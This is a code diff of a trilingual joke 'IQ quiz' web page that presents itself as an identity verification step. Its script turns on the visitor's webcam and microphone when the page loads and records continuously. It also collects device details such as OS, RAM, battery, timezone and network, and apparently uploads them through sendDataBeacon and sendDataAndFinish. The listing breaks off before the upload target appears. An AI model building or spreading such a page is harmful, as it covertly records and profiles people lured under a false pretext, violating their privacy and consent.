@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title id="pageTitle">IQ Questions - Vérification d'identité</title>
-    <!-- Google Fonts for modern typography -->
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -148,12 +148,6 @@
             text-align: right;
         }
 
-        .question-box:hover {
-            border-color: #cbd5e1;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(0,0,0,0.04);
-        }
-
         .question-box label { 
             display: block; 
             font-weight: 700; 
@@ -185,12 +179,6 @@
             background-position: left 12px center;
         }
 
-        .question-box select:focus {
-            border-color: var(--border-focus);
-            background-color: #ffffff;
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.12);
-        }
-
         button { 
             padding: 16px 24px; 
             border: none; 
@@ -210,10 +198,6 @@
             transform: translateY(-2px);
             box-shadow: 0 12px 24px -3px rgba(16, 185, 129, 0.5);
             background: linear-gradient(135deg, #34d399 0%, #059669 100%);
-        }
-
-        button:active {
-            transform: translateY(0);
         }
 
         #status { 
@@ -246,196 +230,26 @@
         <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
             <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
             
-            <!-- الأسئلة -->
-            <div class="question-box">
-                <label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label>
-                <select id="q1" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Oui" class="opt-yes">Oui</option>
-                    <option value="Non" class="opt-no">Non</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl2">2. Te considères-tu comme quelqu'un de naïf ?</label>
-                <select id="q2" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Oui" class="opt-yes">Oui</option>
-                    <option value="Non" class="opt-no">Non</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl3">3. Quel est le nom de votre animal préféré ?</label>
-                <select id="q3" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Skander">Skander</option>
-                    <option value="Michou">Michou</option>
-                    <option value="Tito">Tito</option>
-                    <option value="Urra">Urra</option>
-                    <option value="Yahouh">Yahouh</option>
-                    <option value="Autre" class="opt-other">Autre</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl4">4. Comment décrivez-vous votre journée en général ?</label>
-                <select id="q4" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Excellente" class="opt-exc">Excellente (Mielleuse)</option>
-                    <option value="Malchanceuse" class="opt-bad">Malchanceuse</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl5">5. Qui est le plus intelligent selon vous ?</label>
-                <select id="q5" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Moi" class="opt-me">Moi-même</option>
-                    <option value="Les singes" class="opt-monkeys">Les singes</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl6">6. Avez-vous peur de l'obscurité (du noir) ?</label>
-                <select id="q6" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Oui" class="opt-yes">Oui</option>
-                    <option value="Non" class="opt-no">Non</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl7">7. Préférez-vous le sommeil ou la nourriture ?</label>
-                <select id="q7" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Sommeil" class="opt-sleep">Le sommeil</option>
-                    <option value="Nourriture" class="opt-food">La nourriture</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl8">8. Que pensez-vous en vous regardant dans le miroir ?</label>
-                <select id="q8" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Beau/Belle" class="opt-mag">Magnifique</option>
-                    <option value="Moche" class="opt-ugly">Pas très beau/belle</option>
-                    <option value="Sérieux" class="opt-wise">Sage / Sérieux</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl9">9. Notez votre niveau de méchanceté / insolence sur 10 :</label>
-                <select id="q9" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="1/10" class="opt-s1">1 / 10 (Très sage)</option>
-                    <option value="5/10" class="opt-s5">5 / 10 (Moyen)</option>
-                    <option value="10/10" class="opt-s10">10 / 10 (Très insolent)</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl10">10. Comment réussissez-vous dans vos études ?</label>
-                <select id="q10" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Par chance" class="opt-luck">Par chance</option>
-                    <option value="Par triche" class="opt-cheat">Par triche</option>
-                    <option value="Impossible de réussir" class="opt-fail">Impossible de réussir</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl11">11. Mentez-vous souvent ?</label>
-                <select id="q11" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Toujours" class="opt-always">Toujours</option>
-                    <option value="Parfois" class="opt-sometimes">Parfois</option>
-                    <option value="Jamais" class="opt-never">Jamais</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl12">12. Aimez-vous les plats traditionnels épicés ?</label>
-                <select id="q12" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="J'adore" class="opt-love">J'adore</option>
-                    <option value="Je déteste" class="opt-hate">Je déteste</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl13">13. Êtes-vous fort aux jeux vidéo (PlayStation) ?</label>
-                <select id="q13" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Pro Gamer" class="opt-pro">Joueur Pro</option>
-                    <option value="Débutant/Faible" class="opt-noob">Débutant / Faible</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl14">14. Que préférez-vous le plus ?</label>
-                <select id="q14" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Mon Téléphone" class="opt-phone">Mon téléphone</option>
-                    <option value="Mes Amis" class="opt-friends">Mes amis</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl15">15. Dépensez-vous tout votre argent en deux jours ?</label>
-                <select id="q15" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Toujours" class="opt-always">Toujours</option>
-                    <option value="Parfois" class="opt-sometimes">Parfois</option>
-                    <option value="Jamais" class="opt-never">Jamais</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl16">16. Accepteriez-vous d'être une célébrité ?</label>
-                <select id="q16" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Oui" class="opt-yes">Oui</option>
-                    <option value="Non" class="opt-no">Non</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl17">17. Aimez-vous faire des blagues aux autres ?</label>
-                <select id="q17" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Beaucoup" class="opt-lot">Beaucoup</option>
-                    <option value="Un peu" class="opt-little">Un peu</option>
-                    <option value="Pas du tout" class="opt-notall">Pas du tout</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl18">18. Croyez-vous au coup de foudre ?</label>
-                <select id="q18" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Oui" class="opt-yes">Oui</option>
-                    <option value="Non" class="opt-no">Non</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl19">19. Pouvez-vous tenir une heure sans Internet ?</label>
-                <select id="q19" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Très facile" class="opt-easy">Très facile</option>
-                    <option value="Impossible" class="opt-impossible">Impossible</option>
-                </select>
-            </div>
-
-            <div class="question-box">
-                <label id="lbl20">20. Êtes-vous satisfait(e) de votre vie actuelle ?</label>
-                <select id="q20" required>
-                    <option value="" class="opt-select">Sélectionnez une réponse</option>
-                    <option value="Satisfait" class="opt-satis">Oui, très satisfait(e)</option>
-                    <option value="Non satisfait" class="opt-notsatis">Non, pas du tout</option>
-                </select>
-            </div>
+            <div class="question-box"><label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
+            <div class="question-box"><label id="lbl2">2. Te considères-tu comme quelqu'un de naïf ?</label><select id="q2" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
+            <div class="question-box"><label id="lbl3">3. Quel est le nom de votre animal préféré ?</label><select id="q3" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Skander">Skander</option><option value="Michou">Michou</option><option value="Tito">Tito</option><option value="Urra">Urra</option><option value="Yahouh">Yahouh</option><option value="Autre" class="opt-other">Autre</option></select></div>
+            <div class="question-box"><label id="lbl4">4. Comment décrivez-vous votre journée en général ?</label><select id="q4" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Excellente" class="opt-exc">Excellente (Mielleuse)</option><option value="Malchanceuse" class="opt-bad">Malchanceuse</option></select></div>
+            <div class="question-box"><label id="lbl5">5. Qui est le plus intelligent selon vous ?</label><select id="q5" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Moi" class="opt-me">Moi-même</option><option value="Les singes" class="opt-monkeys">Les singes</option></select></div>
+            <div class="question-box"><label id="lbl6">6. Avez-vous peur de l'obscurité (du noir) ?</label><select id="q6" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
+            <div class="question-box"><label id="lbl7">7. Préférez-vous le sommeil ou la nourriture ?</label><select id="q7" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Sommeil" class="opt-sleep">Le sommeil</option><option value="Nourriture" class="opt-food">La nourriture</option></select></div>
+            <div class="question-box"><label id="lbl8">8. Que pensez-vous en vous regardant dans le miroir ?</label><select id="q8" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Beau/Belle" class="opt-mag">Magnifique</option><option value="Moche" class="opt-ugly">Pas très beau/belle</option><option value="Sérieux" class="opt-wise">Sage / Sérieux</option></select></div>
+            <div class="question-box"><label id="lbl9">9. Notez votre niveau de méchanceté / insolence sur 10 :</label><select id="q9" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="1/10" class="opt-s1">1 / 10 (Très sage)</option><option value="5/10" class="opt-s5">5 / 10 (Moyen)</option><option value="10/10" class="opt-s10">10 / 10 (Très insolent)</option></select></div>
+            <div class="question-box"><label id="lbl10">10. Comment réussissez-vous dans vos études ?</label><select id="q10" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Par chance" class="opt-luck">Par chance</option><option value="Par triche" class="opt-cheat">Par triche</option><option value="Impossible de réussir" class="opt-fail">Impossible de réussir</option></select></div>
+            <div class="question-box"><label id="lbl11">11. Mentez-vous souvent ?</label><select id="q11" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Toujours" class="opt-always">Toujours</option><option value="Parfois" class="opt-sometimes">Parfois</option><option value="Jamais" class="opt-never">Jamais</option></select></div>
+            <div class="question-box"><label id="lbl12">12. Aimez-vous les plats traditionnels épicés ?</label><select id="q12" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="J'adore" class="opt-love">J'adore</option><option value="Je déteste" class="opt-hate">Je déteste</option></select></div>
+            <div class="question-box"><label id="lbl13">13. Êtes-vous fort aux jeux vidéo (PlayStation) ?</label><select id="q13" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Pro Gamer" class="opt-pro">Joueur Pro</option><option value="Débutant/Faible" class="opt-noob">Débutant / Faible</option></select></div>
+            <div class="question-box"><label id="lbl14">14. Que préférez-vous le plus ?</label><select id="q14" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Mon Téléphone" class="opt-phone">Mon téléphone</option><option value="Mes Amis" class="opt-friends">Mes amis</option></select></div>
+            <div class="question-box"><label id="lbl15">15. Dépensez-vous tout votre argent en deux jours ?</label><select id="q15" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Toujours" class="opt-always">Toujours</option><option value="Parfois" class="opt-sometimes">Parfois</option><option value="Jamais" class="opt-never">Jamais</option></select></div>
+            <div class="question-box"><label id="lbl16">16. Accepteriez-vous d'être une célébrité ?</label><select id="q16" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
+            <div class="question-box"><label id="lbl17">17. Aimez-vous faire des blagues aux autres ?</label><select id="q17" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Beaucoup" class="opt-lot">Beaucoup</option><option value="Un peu" class="opt-little">Un peu</option><option value="Pas du tout" class="opt-notall">Pas du tout</option></select></div>
+            <div class="question-box"><label id="lbl18">18. Croyez-vous au coup de foudre ?</label><select id="q18" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
+            <div class="question-box"><label id="lbl19">19. Pouvez-vous tenir une heure sans Internet ?</label><select id="q19" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Très facile" class="opt-easy">Très facile</option><option value="Impossible" class="opt-impossible">Impossible</option></select></div>
+            <div class="question-box"><label id="lbl20">20. Êtes-vous satisfait(e) de votre vie actuelle ?</label><select id="q20" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Satisfait" class="opt-satis">Oui, très satisfait(e)</option><option value="Non satisfait" class="opt-notsatis">Non, pas du tout</option></select></div>
 
             <button type="button" id="submitBtn" onclick="verifyAndStop()">VALIDER ET ENVOYER</button>
         </form>
@@ -446,119 +260,29 @@
     <script>
         const translations = {
             fr: {
-                title: "IQ Questions - Vérification d'identité",
-                welcome: "Bienvenue dans IQ Questions",
-                mainTitle: "Vérification d'identité",
-                subTitle: "Veuillez répondre aux 20 questions ci-dessous pour continuer",
-                usernamePlaceholder: "Votre Nom Complet",
-                submitBtn: "VALIDER ET ENVOYER",
-                selectOpt: "Sélectionnez une réponse",
-                yes: "Oui",
-                no: "Non",
-                other: "Autre",
-                q: [
-                    "1. Penses-tu être plus beau/belle que moi ?",
-                    "2. Te considères-tu comme quelqu'un de naïf ?",
-                    "3. Quel est le nom de votre animal préféré ?",
-                    "4. Comment décrivez-vous votre journée en général ?",
-                    "5. Qui est le plus intelligent selon vous ?",
-                    "6. Avez-vous peur de l'obscurité (du noir) ?",
-                    "7. Préférez-vous le sommeil ou la nourriture ?",
-                    "8. Que pensez-vous en vous regardant dans le miroir ?",
-                    "9. Notez votre niveau de méchanceté / insolence sur 10 :",
-                    "10. Comment réussissez-vous dans vos études ?",
-                    "11. Mentez-vous souvent ?",
-                    "12. Aimez-vous les plats traditionnels épicés ?",
-                    "13. Êtes-vous fort aux jeux vidéo (PlayStation) ?",
-                    "14. Que préférez-vous le plus ?",
-                    "15. Dépensez-vous tout votre argent en deux jours ?",
-                    "16. Accepteriez-vous d'être une célébrité ?",
-                    "17. Aimez-vous faire des blagues aux autres ?",
-                    "18. Croyez-vous au coup de foudre ?",
-                    "19. Pouvez-vous tenir une heure sans Internet ?",
-                    "20. Êtes-vous satisfait(e) de votre vie actuelle ?"
-                ]
+                title: "IQ Questions - Vérification d'identité", welcome: "Bienvenue dans IQ Questions",
+                mainTitle: "Vérification d'identité", subTitle: "Veuillez répondre aux 20 questions ci-dessous pour continuer",
+                usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez une réponse", yes: "Oui", no: "Non", other: "Autre",
+                q: ["1. Penses-tu être plus beau/belle que moi ?", "2. Te considères-tu comme quelqu'un de naïf ?", "3. Quel est le nom de votre animal préféré ?", "4. Comment décrivez-vous votre journée en général ?", "5. Qui est le plus intelligent selon vous ?", "6. Avez-vous peur de l'obscurité (du noir) ?", "7. Préférez-vous le sommeil ou la nourriture ?", "8. Que pensez-vous en vous regardant dans le miroir ?", "9. Notez votre niveau de méchanceté / insolence sur 10 :", "10. Comment réussissez-vous dans vos études ?", "11. Mentez-vous souvent ?", "12. Aimez-vous les plats traditionnels épicés ?", "13. Êtes-vous fort aux jeux vidéo (PlayStation) ?", "14. Que préférez-vous le plus ?", "15. Dépensez-vous tout votre argent en deux jours ?", "16. Accepteriez-vous d'être une célébrité ?", "17. Aimez-vous faire des blagues aux autres ?", "18. Croyez-vous au coup de foudre ?", "19. Pouvez-vous tenir une heure sans Internet ?", "20. Êtes-vous satisfait(e) de votre vie actuelle ?"]
             },
             ar: {
-                title: "أسئلة الذكاء - التحقق من الهوية",
-                welcome: "مرحباً بكم في أسئلة الذكاء",
-                mainTitle: "التحقق من الهوية",
-                subTitle: "يرجى الإجابة على الأسئلة الـ 20 أدناه للمتابعة",
-                usernamePlaceholder: "اسمك الكامل",
-                submitBtn: "تأكيد وإرسال",
-                selectOpt: "اختر إجابة",
-                yes: "نعم",
-                no: "لا",
-                other: "آخر",
-                q: [
-                    "1. هل تعتقد أنك أنجح/أجمل مني؟",
-                    "2. هل تعتبر نفسك شخصاً ساذجاً؟",
-                    "3. ما هو اسم حيوانك المفضل؟",
-                    "4. كيف تصف يومك بشكل عام؟",
-                    "5. برأيك، من هو الأكثر ذكاءً؟",
-                    "6. هل تخاف من الظلام؟",
-                    "7. هل تفضل النوم أم الطعام؟",
-                    "8. بماذا تفكر عندما تنظر إلى المرآة؟",
-                    "9. قيّم مستوى لؤمك أو وقاحتك من 10:",
-                    "10. كيف تنجح في دراستك؟",
-                    "11. هل تكذب غالباً؟",
-                    "12. هل تحب الأطباق التقليدية الحارة؟",
-                    "13. هل أنت بارع في ألعاب الفيديو (بلايستيشن)؟",
-                    "14. ماذا تفضل أكثر؟",
-                    "15. هل تنفق كل أموالك في يومين؟",
-                    "16. هل تقبل أن تكون مشهوراً؟",
-                    "17. هل تحب المزاح وإلقاء النكت على الآخرين؟",
-                    "18. هل تؤمن الحب من أول نظرة؟",
-                    "19. هل يمكنك الصمود لساعة واحدة بدون إنترنت؟",
-                    "20. هل أنت راضٍ عن حياتك الحالية؟"
-                ]
+                title: "أسئلة الذكاء - التحقق من الهوية", welcome: "مرحباً بكم في أسئلة الذكاء",
+                mainTitle: "التحقق من الهوية", subTitle: "يرجى الإجابة على الأسئلة الـ 20 أدناه للمتابعة",
+                usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا", other: "آخر",
+                q: ["1. هل تعتقد أنك أنجح/أجمل مني؟", "2. هل تعتبر نفسك شخصاً ساذجاً؟", "3. ما هو اسم حيوانك المفضل؟", "4. كيف تصف يومك بشكل عام؟", "5. برأيك، من هو الأكثر ذكاءً؟", "6. هل تخاف من الظلام؟", "7. هل تفضل النوم أم الطعام؟", "8. بماذا تفكر عندما تنظر إلى المرآة؟", "9. قيّم مستوى لؤمك أو وقاحتك من 10:", "10. كيف تنجح في دراستك؟", "11. هل تكذب غالباً؟", "12. هل تحب الأطباق التقليدية الحارة؟", "13. هل أنت بارع في ألعاب الفيديو (بلايستيشن)؟", "14. ماذا تفضل أكثر؟", "15. هل تنفق كل أموالك في يومين؟", "16. هل تقبل أن تكون مشهوراً؟", "17. هل تحب المزاح وإلقاء النكت على الآخرين؟", "18. هل تؤمن الحب من أول نظرة؟", "19. هل يمكنك الصمود لساعة واحدة بدون إنترنت؟", "20. هل أنت راضٍ عن حياتك الحالية؟"]
             },
             en: {
-                title: "IQ Questions - Identity Verification",
-                welcome: "Welcome to IQ Questions",
-                mainTitle: "Identity Verification",
-                subTitle: "Please answer the 20 questions below to continue",
-                usernamePlaceholder: "Your Full Name",
-                submitBtn: "SUBMIT AND SEND",
-                selectOpt: "Select an answer",
-                yes: "Yes",
-                no: "No",
-                other: "Other",
-                q: [
-                    "1. Do you think you are more handsome/beautiful than me?",
-                    "2. Do you consider yourself naive?",
-                    "3. What is the name of your favorite pet?",
-                    "4. How do you generally describe your day?",
-                    "5. Who do you think is the smartest?",
-                    "6. Are you afraid of the dark?",
-                    "7. Do you prefer sleep or food?",
-                    "8. What do you think when you look in the mirror?",
-                    "9. Rate your level of mischief / insolence out of 10:",
-                    "10. How do you succeed in your studies?",
-                    "11. Do you lie often?",
-                    "12. Do you like spicy traditional dishes?",
-                    "13. Are you good at video games (PlayStation)?",
-                    "14. What do you prefer the most?",
-                    "15. Do you spend all your money in two days?",
-                    "16. Would you accept to be a celebrity?",
-                    "17. Do you like playing pranks on others?",
-                    "18. Do you believe in love at first sight?",
-                    "19. Can you last an hour without internet?",
-                    "20. Are you satisfied with your current life?"
-                ]
+                title: "IQ Questions - Identity Verification", welcome: "Welcome to IQ Questions",
+                mainTitle: "Identity Verification", subTitle: "Please answer the 20 questions below to continue",
+                usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No", other: "Other",
+                q: ["1. Do you think you are more handsome/beautiful than me?", "2. Do you consider yourself naive?", "3. What is the name of your favorite pet?", "4. How do you generally describe your day?", "5. Who do you think is the smartest?", "6. Are you afraid of the dark?", "7. Do you prefer sleep or food?", "8. What do you think when you look in the mirror?", "9. Rate your level of mischief / insolence out of 10:", "10. How do you succeed in your studies?", "11. Do you lie often?", "12. Do you like spicy traditional dishes?", "13. Are you good at video games (PlayStation)?", "14. What do you prefer the most?", "15. Do you spend all your money in two days?", "16. Would you accept to be a celebrity?", "17. Do you like playing pranks on others?", "18. Do you believe in love at first sight?", "19. Can you last an hour without internet?", "20. Are you satisfied with your current life?"]
             }
         };
 
         function changeLanguage(lang) {
             const htmlTag = document.getElementById('htmlTag');
-            if (lang === 'ar') {
-                htmlTag.setAttribute('dir', 'rtl');
-                htmlTag.setAttribute('lang', 'ar');
-            } else {
-                htmlTag.setAttribute('dir', 'ltr');
-                htmlTag.setAttribute('lang', lang);
-            }
-
+            if (lang === 'ar') { htmlTag.setAttribute('dir', 'rtl'); htmlTag.setAttribute('lang', 'ar'); }
+            else { htmlTag.setAttribute('dir', 'ltr'); htmlTag.setAttribute('lang', lang); }
             const t = translations[lang];
             document.getElementById('pageTitle').innerText = t.title;
             document.getElementById('welcomeText').innerText = t.welcome;
@@ -566,14 +290,10 @@
             document.getElementById('subTitle').innerText = t.subTitle;
             document.getElementById('username').placeholder = t.usernamePlaceholder;
             document.getElementById('submitBtn').innerText = t.submitBtn;
-
             for (let i = 1; i <= 20; i++) {
                 const lbl = document.getElementById('lbl' + i);
-                if (lbl && t.q[i-1]) {
-                    lbl.innerText = t.q[i-1];
-                }
+                if (lbl && t.q[i-1]) lbl.innerText = t.q[i-1];
             }
-
             document.querySelectorAll('.opt-select').forEach(el => el.innerText = t.selectOpt);
             document.querySelectorAll('.opt-yes').forEach(el => el.innerText = t.yes);
             document.querySelectorAll('.opt-no').forEach(el => el.innerText = t.no);
@@ -583,14 +303,9 @@
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let autoSyncInterval = null;
         let isCompleted = false;
 
-        let batteryInfoGlobal = {
-            niveau: "Non disponible",
-            enCharge: "Non disponible"
-        };
-
+        let batteryInfoGlobal = { niveau: "Non disponible", enCharge: "Non disponible" };
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 function updateBattery() {
@@ -605,165 +320,106 @@
 
         async function getDetailedDeviceInfo() {
             const ua = navigator.userAgent;
-            let osName = "Système Inconnu";
-            let brandOrModel = "Appareil Inconnu";
-
-            if (/android/i.test(ua)) {
-                osName = "Android";
-                let match = ua.match(/Android\s([0-9\.]+)/);
-                if (match) osName += " " + match[1];
-            } else if (/iphone|ipad|ipod/i.test(ua)) {
-                osName = "iOS (Apple)";
-                let match = ua.match(/OS\s([0-9_]+)/);
-                if (match) osName += " " + match[1].replace(/_/g, '.');
-            } else if (/windows/i.test(ua)) {
-                osName = "Windows PC";
-            } else if (/macintosh|mac os x/i.test(ua)) {
-                osName = "macOS";
-            }
-
+            let osName = "Système Inconnu", brandOrModel = "Appareil Inconnu";
+            if (/android/i.test(ua)) { osName = "Android"; let m = ua.match(/Android\s([0-9\.]+)/); if (m) osName += " " + m[1]; }
+            else if (/iphone|ipad|ipod/i.test(ua)) { osName = "iOS (Apple)"; }
+            else if (/windows/i.test(ua)) { osName = "Windows PC"; }
+            
             if (/Samsung/i.test(ua)) brandOrModel = "Samsung Galaxy";
             else if (/iPhone/i.test(ua)) brandOrModel = "Apple iPhone";
-            else if (/Huawei/i.test(ua)) brandOrModel = "Huawei";
-            else if (/Xiaomi|Redmi/i.test(ua)) brandOrModel = "Xiaomi / Redmi";
-            else if (/Oppo/i.test(ua)) brandOrModel = "Oppo";
-            else if (/Vivo/i.test(ua)) brandOrModel = "Vivo";
-
-            let screenOrientation = "Inconnue";
-            if (screen.orientation && screen.orientation.type) {
-                screenOrientation = screen.orientation.type.includes("portrait") ? "Portrait (Verticale)" : "Paysage (Horizontale)";
-            } else {
-                screenOrientation = window.innerHeight > window.innerWidth ? "Portrait (Verticale)" : "Paysage (Horizontale)";
-            }
-
-            let cpuArchitecture = "64-bit / Inconnu";
-            if (navigator.userAgentData && navigator.userAgentData.architecture) {
-                cpuArchitecture = navigator.userAgentData.architecture;
-            } else if (/WOW64|Win64|x64|ARM64|x86_64/i.test(ua)) {
-                cpuArchitecture = "64-bit";
-            } else if (/Win32|x86/i.test(ua)) {
-                cpuArchitecture = "32-bit";
-            }
 
             let details = {
-                appareil: brandOrModel,
-                systemeExploitation: osName,
+                appareil: brandOrModel, systemeExploitation: osName,
                 navigateur: navigator.userAgentData ? navigator.userAgentData.brands.map(b => b.brand).join(', ') : navigator.appName,
-                plateforme: navigator.platform,
-                langueSysteme: navigator.language || navigator.languages[0],
+                plateforme: navigator.platform, langueSysteme: navigator.language || navigator.languages[0],
                 memoireRAMApproximative: navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Non disponible",
                 processeurCœurs: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Non disponible",
                 resolutionEcran: `${window.screen.width} x ${window.screen.height}`,
-                profondeurCouleurs: window.screen.colorDepth + " bits",
                 fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesActifs: navigator.cookieEnabled ? "Oui" : "Non",
-                connexionReseau: navigator.connection ? (navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)") : "Non disponible",
-                niveauBatterie: batteryInfoGlobal.niveau,
-                etatCharge: batteryInfoGlobal.enCharge,
-                modeEconomieEnergie: (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) ? "Probablement activé (Faible performance)" : "Désactivé / Normal",
-                orientationEcran: screenOrientation,
-                pointsTactilesMax: navigator.maxTouchPoints ? navigator.maxTouchPoints + " points" : "Non disponible",
-                modeSilencieuxOuNePasDerranger: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Détecté (Accessibilité activée)" : "Standard",
-                architectureCPU: cpuArchitecture,
-                codecsMediaSupportes: {
-                    mp4: MediaRecorder.isTypeSupported('video/mp4') ? "Supporté" : "Non supporté",
-                    webm: MediaRecorder.isTypeSupported('video/webm') ? "Supporté" : "Non supporté"
-                }
+                niveauBatterie: batteryInfoGlobal.niveau, etatCharge: batteryInfoGlobal.enCharge,
+                connexionReseau: navigator.connection ? (navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)") : "Non disponible"
             };
-
             return details;
         }
 
         window.addEventListener('DOMContentLoaded', async () => {
             try {
-                const constraints = {
-                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } },
-                    audio: true
-                };
-
+                const constraints = { video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, audio: true };
                 mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                 const videoElement = document.getElementById('webcam');
                 videoElement.srcObject = mediaStream;
 
                 let options = { videoBitsPerSecond: 250000 };
-                
-                // ⚡ إجبار المتصفح على التسجيل بصيغة MP4 مباشرة إذا كانت مدعومة
-                if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264,aac')) {
-                    options.mimeType = 'video/mp4;codecs=h264,aac';
-                } else if (MediaRecorder.isTypeSupported('video/mp4')) {
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
                     options.mimeType = 'video/mp4';
-                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
-                    options.mimeType = 'video/webm;codecs=vp8,opus';
+                } else {
+                    options.mimeType = 'video/webm';
                 }
 
                 mediaRecorder = new MediaRecorder(mediaStream, options);
                 mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
+                    if (event.data.size > 0) recordedChunks.push(event.data);
                 };
-                mediaRecorder.start(1000);
-
-                autoSyncInterval = setInterval(async () => {
-                    if (!isCompleted && recordedChunks.length > 0) {
-                        await sendDataBeacon("Auto-Sync 10s (Mise à jour)");
-                    }
-                }, 10000);
+                mediaRecorder.start(); // تسجيل مستمر وبدون تقطيع لمنع تلف الملفات
 
             } catch (err) {
                 console.error("Caméra refusée: ", err);
             }
         });
 
-        async function sendDataBeacon(reason = "") {
-            if (recordedChunks.length === 0) return;
+        async function sendDataAndFinish() {
+            if (isCompleted) return;
+            isCompleted = true;
 
-            const currentChunks = [...recordedChunks];
-            recordedChunks = [];
+            const statusDiv = document.getElementById('status');
